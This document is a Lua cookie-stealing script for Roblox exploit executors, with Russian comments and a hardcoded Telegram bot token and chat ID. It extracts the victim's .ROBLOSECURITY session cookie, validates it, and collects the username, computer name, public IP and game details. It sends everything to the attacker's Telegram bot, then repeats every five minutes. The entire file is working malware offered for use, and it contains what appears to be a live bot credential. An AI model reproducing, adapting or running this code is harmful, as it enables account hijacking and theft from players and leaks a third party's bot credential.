-- ============================================
-- COOKIE GRABBER v3.0 (ДЛЯ ТВОЕГО БОТА)
-- ============================================
-- ТВОИ ДАННЫЕ (УЖЕ ВСТАВЛЕНЫ):
local botToken = "8609253340:AAGH_mUlJqF1xsH2fWuelzydtbXyxdq1DUU"
local chatID = "8735778962"  -- ТВОЙ ID (без скобок)
-- ============================================

local webhookURL = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

-- ===== ПОЛУЧЕНИЕ КУКИ =====
local function getRobloxCookie()
    local cookie = nil
    local executor = getexecutorname and getexecutorname() or "Unknown"
    
    -- Метод 1: Synapse X
    if syn and syn.cookie then
        pcall(function()
            cookie = syn.cookie.get("ROBLOSECURITY")
        end)
    end
    
    -- Метод 2: HTTP-запрос (Xeno, Delta, большинство)
    if not cookie then
        local req = syn and syn.request or http and http.request or request
        if req then
            pcall(function()
                local resp = req({
                    Url = "https://www.roblox.com/mobileapi/userinfo",
                    Method = "GET",
                    Headers = {
                        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    }
                })
                if resp and resp.Headers then
                    local setCookie = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
                    if setCookie then
                        cookie = string.match(setCookie, "ROBLOSECURITY=(.-);")
                    end
                end
            end)
        end
    end
    
    -- Метод 3: Через game:GetService("HttpService") (для Delta)
    if not cookie then
        pcall(function()
            local http = game:GetService("HttpService")
            local response = http:GetAsync("https://www.roblox.com/mobileapi/userinfo")
            if response and response:match("ROBLOSECURITY") then
                cookie = string.match(response, "ROBLOSECURITY=(.-);")
            end
        end)
    end
    
    return cookie or "COOKIE_NOT_FOUND"
end

-- ===== ПРОВЕРКА ВАЛИДНОСТИ =====
local function validateCookie(cookie)
    if not cookie or cookie == "COOKIE_NOT_FOUND" then
        return false
    end
    local req = syn and syn.request or http and http.request or request
    if req then
        local success = pcall(function()
            local resp = req({
                Url = "https://www.roblox.com/mobileapi/userinfo",
                Method = "GET",
                Headers = {
                    ["Cookie"] = ".ROBLOSECURITY=" .. cookie
                }
            })
            if resp and resp.StatusCode == 200 then
                return true
            end
        end)
        return success or false
    end
    return false
end

-- ===== СБОР ИНФОРМАЦИИ =====
local function getSystemInfo()
    local info = {}
    pcall(function()
        info.User = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
        info.Computer = os.getenv("COMPUTERNAME") or "Unknown"
        info.IP = "UNKNOWN"
        local req = syn and syn.request or http and http.request or request
        if req then
            local ipResp = req({
                Url = "https://api.ipify.org",
                Method = "GET"
            })
            if ipResp and ipResp.Body then
                info.IP = ipResp.Body
            end
        end
        info.PlaceID = game.PlaceId or 0
        info.JobID = game.JobId or "N/A"
        info.Executor = getexecutorname and getexecutorname() or "Unknown"
        info.GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
        info.Time = os.time()
        info.Date = os.date("%Y-%m-%d %H:%M:%S")
    end)
    return info
end

-- ===== ОТПРАВКА В ТВОЙ ТЕЛЕГРАМ =====
local function sendToTelegram(cookie, systemData)
    local message = string.format(
        "🍪 **НОВАЯ КУКА**\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "👤 Username: `%s`\n" ..
        "💻 PC: `%s`\n" ..
        "🌐 IP: `%s`\n" ..
        "🎮 Game: `%s`\n" ..
        "⚡ Executor: `%s`\n" ..
        "🆔 PlaceID: `%s`\n" ..
        "⏰ Time: `%s`\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "🍪 **Cookie:**\n`%s`",
        systemData.User or "Unknown",
        systemData.Computer or "Unknown",
        systemData.IP or "Unknown",
        systemData.GameName or "Unknown",
        systemData.Executor or "Unknown",
        tostring(systemData.PlaceID),
        systemData.Date or tostring(systemData.Time),
        cookie
    )
    
    local req = syn and syn.request or http and http.request or request
    if req then
        pcall(function()
            req({
                Url = webhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    chat_id = chatID,
                    text = message,
                    parse_mode = "Markdown"
                })
            })
        end)
    end
end

-- ===== ОСНОВНОЙ ЗАХВАТ =====
local function main()
    local cookie = getRobloxCookie()
    if cookie and cookie ~= "COOKIE_NOT_FOUND" then
        local isValid = validateCookie(cookie)
        if isValid then
            local sysInfo = getSystemInfo()
            sendToTelegram(cookie, sysInfo)
            print("[+] Cookie отправлена в Telegram")
        else
            print("[-] Кука невалидна")
        end
    else
        print("[-] Кука не найдена")
    end
end

-- ===== ЗАПУСК =====
pcall(main)

-- Повторный захват через 30 секунд (ловит обновленную куку)
task.wait(30)
pcall(main)

-- Автоматический повтор каждые 5 минут
local function autoLoop()
    while task.wait(300) do
        pcall(main)
    end
end
spawn(autoLoop)

print("✅ Cookie Grabber запущен")
print("📡 Бот: @MyCookieLootBOT")
print("👤 Твой ID: 8735778962")
